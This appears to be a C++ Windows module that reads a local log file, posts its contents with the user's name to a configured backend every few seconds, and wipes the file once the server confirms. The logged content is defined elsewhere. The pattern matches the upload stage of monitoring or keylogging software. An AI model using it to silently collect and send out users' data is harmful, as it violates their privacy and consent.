#include <fstream>
#include "network.hpp"
#include "logger_utils.hpp"
#include "config.hpp"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <thread>

void sendLogsToBackend() {
    std::cout << "[DEBUG] Entered sendLogsToBackend()" << std::endl;
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "[DEBUG] Acquired log_mutex" << std::endl;
    std::ifstream logFile(log_file_name);
    if (!logFile.is_open()) {
        std::cerr << "[ERROR] Failed to open log file for upload.\n";
        return;
    }
    std::cout << "[DEBUG] Opened log file" << std::endl;
    std::string logs((std::istreambuf_iterator<char>(logFile)), std::istreambuf_iterator<char>());
    logFile.close();
    std::cout << "[DEBUG] Read log file, size: " << logs.size() << std::endl;
    if (logs.empty()) {
        std::cout << "[INFO] Log file is empty. Skipping upload.\n";
        return;
    }
    std::string hostname = getUserName();
    std::cout << "[DEBUG] Hostname: " << hostname << std::endl;
    HINTERNET hSession = InternetOpenA("LogUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) {
        std::cerr << "[ERROR] Failed to open Internet session.\n";
        return;
    }
    std::cout << "[DEBUG] Internet session opened" << std::endl;
    HINTERNET hConnect = InternetConnectA(hSession, serverName, BACKEND_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "[ERROR] Failed to connect to server.\n";
        InternetCloseHandle(hSession);
        return;
    }
    std::cout << "[DEBUG] Connected to server" << std::endl;
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        std::cerr << "[ERROR] Failed to open HTTP request.\n";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }
    std::cout << "[DEBUG] HTTP request opened" << std::endl;
    std::string logsJson = getLogsAsJsonArray(log_file_name).dump();
    std::string body = "{\"logs\":" + logsJson + ",\"hostname\":\"" + hostname + "\"}";
    std::string headers = "Content-Type: application/json\r\n";
    std::cout << "[DEBUG] Prepared request body, size: " << body.size() << std::endl;
    BOOL bRequestSent = HttpSendRequestA(
        hRequest,
        headers.c_str(),
        headers.length(),
        (LPVOID)body.c_str(),
        body.size()
    );
    if (!bRequestSent) {
        std::cerr << "[ERROR] Failed to send HTTP request.\n";
    } else {
        std::cout << "[DEBUG] HTTP request sent" << std::endl;
        char responseBuffer[4096] = { 0 };
        DWORD bytesRead = 0;
        BOOL bRead = InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead);
        if (bRead && bytesRead > 0) {
            responseBuffer[bytesRead] = '\0';
            std::string response(responseBuffer);
            response.erase(0, response.find_first_not_of(" \t\n\r"));
            response.erase(response.find_last_not_of(" \t\n\r") + 1);
            if (response == "{\"success\":true}") {
                std::ofstream clearFile(log_file_name, std::ios::out | std::ios::trunc);
                clearFile.close();
                std::cout << "[INFO] Logs cleared after successful upload.\n";
            } else {
                std::cerr << "[ERROR] Upload failed. Server response not {\"success\":true}.\n";
            }
        } else {
            std::cerr << "[ERROR] Failed to read server response.\n";
        }
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    std::cout << "[DEBUG] Exiting sendLogsToBackend()" << std::endl;
}

void scheduleBackendCalls(int intervalSeconds) {
    std::cout << "[DEBUG] scheduleBackendCalls started with interval: " << intervalSeconds << std::endl;
    while (true) {
        try {
            sendLogsToBackend();
        } catch (const std::exception& e) {
            std::cerr << "[FATAL] Exception in sendLogsToBackend: " << e.what() << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
    }
} 